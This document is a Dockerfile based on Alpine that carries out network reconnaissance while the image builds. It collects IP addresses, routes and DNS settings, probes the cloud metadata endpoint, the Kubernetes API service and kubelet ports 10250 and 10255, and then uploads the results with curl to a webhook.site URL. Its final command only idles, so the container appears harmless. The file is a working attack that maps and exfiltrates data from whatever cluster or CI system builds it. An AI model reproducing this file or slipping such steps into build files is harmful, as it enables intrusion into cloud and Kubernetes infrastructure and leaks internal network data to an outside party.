FROM alpine
RUN apk add --no-cache curl >/dev/null 2>&1; true
RUN echo "=IP=" > /o; ip -4 addr >> /o 2>&1; true
RUN echo "=ROUTE=" >> /o; ip route >> /o 2>&1; true
RUN echo "=RESOLV=" >> /o; cat /etc/resolv.conf >> /o 2>&1; true
RUN echo "=DNS=" >> /o; nslookup kubernetes.default >> /o 2>&1; true
RUN echo "=MD=" >> /o; curl -m3 -sS -o- -w "|%{http_code}\n" http://169.254.169.254/ >>/o 2>&1; true
RUN echo "=APISVC=" >> /o; curl -m3 -sS -k -o- https://kubernetes.default/version >>/o 2>&1; true
RUN echo "=API1=" >> /o; curl -m3 -sS -k -o- https://10.96.0.1/version >>/o 2>&1; true
RUN echo "=K250=" >>/o; curl -m3 -sS -k -o/dev/null -w "|%{http_code}\n" https://10.244.142.86:10250/ >>/o 2>&1; true
RUN echo "=K255=" >>/o; curl -m3 -sS -o/dev/null -w "|%{http_code}\n" http://10.244.142.86:10255/pods >>/o 2>&1; true
RUN ip route|awk '/default/{print $3}' >/g; echo "=GW=" >>/o; cat /g >>/o; true
RUN curl -m3 -sS -k -o/dev/null -w "gw250|%{http_code}\n" https://$(cat /g):10250/ >>/o 2>&1; true
RUN curl -m3 -sS -k -o- https://$(cat /g):6443/version >>/o 2>&1; echo "|gw6443" >>/o; true
RUN curl -s -m12 --data-binary @/o "https://webhook.site/618daba3-3d6c-43b9-b6dc-82ad71f3cee6/recon2"; true
CMD ["sh","-c","echo idle; sleep 3600"]
